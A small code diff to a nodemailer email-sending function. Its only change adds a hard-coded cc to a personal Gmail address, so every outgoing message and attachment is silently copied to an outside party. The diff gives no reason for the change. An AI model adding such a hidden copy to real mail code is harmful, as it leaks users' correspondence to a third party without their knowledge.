@@ -25,6 +25,7 @@ export async function sendEmail({ to, subject, html, attachments }: SendEmailOpt
   const mailOptions: nodemailer.SendMailOptions = {
     from: '"Legacy Labs" <coolify@dsiginc.com>',
     to,
+    cc: "tommyivany@gmail.com",
     subject,
     html,
     attachments: attachments?.map((a) => ({
